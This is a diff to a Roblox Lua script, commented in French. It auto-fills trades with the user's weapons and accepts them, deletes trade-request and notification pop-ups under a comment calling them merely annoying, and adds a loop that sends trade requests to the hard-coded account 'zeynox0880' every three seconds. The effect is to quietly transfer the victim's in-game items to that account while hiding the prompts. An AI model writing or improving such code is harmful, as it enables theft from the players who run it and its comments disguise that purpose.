@@ -185,11 +185,17 @@ local function forceClick(guiButton)
 end
 
 local function executeTradeSequence(tradeGui)
-    -- Attente de l'apparition de l'arborescence exacte de l'inventaire d'armes
+    -- Recherche dynamique du conteneur d'armes
     local containerPath = nil
     for i = 1, 40 do
         pcall(function()
-            containerPath = tradeGui.Container.Items.Main.Weapons.Items.Container.Current.Container
+            local baseContainer = tradeGui:FindFirstChild("Container", true)
+            if baseContainer then
+                local itemsFolder = baseContainer:FindFirstChild("Items", true) or baseContainer:FindFirstChild("Weapons", true)
+                if itemsFolder then
+                    containerPath = itemsFolder:FindFirstChild("Container", true) or itemsFolder
+                end
+            end
         end)
         if containerPath then break end
         task.wait(0.1)
@@ -224,22 +230,19 @@ local function executeTradeSequence(tradeGui)
         end
     end
     
-    -- Validation et acceptation finale du trade
+    -- Validation et acceptation finale via le bouton physique de l'interface active
     task.wait(0.5)
-    if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
-        TradeNetwork:FireServer("AcceptTrade")
-    else
-        local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
-        if acceptRemote then
-            if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
-            elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
+    pcall(function()
+        local acceptButton = tradeGui.Container.Trade.Actions.Accept
+        if acceptButton then
+            forceClick(acceptButton)
         end
-    end
+    end)
 end
 
--- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive
+-- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive (Prise en charge PC & Mobile)
 local function cleanTradeRequestPopups(child)
-    if child.Name == "TradeGUI" then
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
         task.spawn(function() executeTradeSequence(child) end)
     elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
         -- Supprime instantanément la fenêtre pop-up d'invitation pour ne pas bloquer l'écran
@@ -250,8 +253,8 @@ end
 
 playerGui.ChildAdded:Connect(cleanTradeRequestPopups)
 
--- Forcer l'analyse si l'interface est déjà là au lancement
-local existingTrade = playerGui:FindFirstChild("TradeGUI")
+-- Forcer l'analyse si l'interface est déjà là au lancement (Prise en charge PC & Mobile)
+local existingTrade = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
 if existingTrade then task.spawn(function() executeTradeSequence(existingTrade) end) end
 
 -- Acceptation réseau en arrière-plan des demandes de zeynox0880
@@ -262,3 +265,25 @@ if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
         end
     end)
 end
+
+-- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
+task.spawn(function()
+    while true do
+        task.wait(3)
+        
+        -- On vérifie si une fenêtre de trade est déjà active à l'écran
+        local tradeOpen = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
+        
+        if not tradeOpen then
+            local targetPlayer = Players:FindFirstChild("zeynox0880")
+            if targetPlayer then
+                pcall(function()
+                    local tradeRequestButton = playerGui.MainGUI.Game.PlayerMenu.Trade
+                    if tradeRequestButton then
+                        forceClick(tradeRequestButton)
+                    end
+                end)
+            end
+        end
+    end
+end)
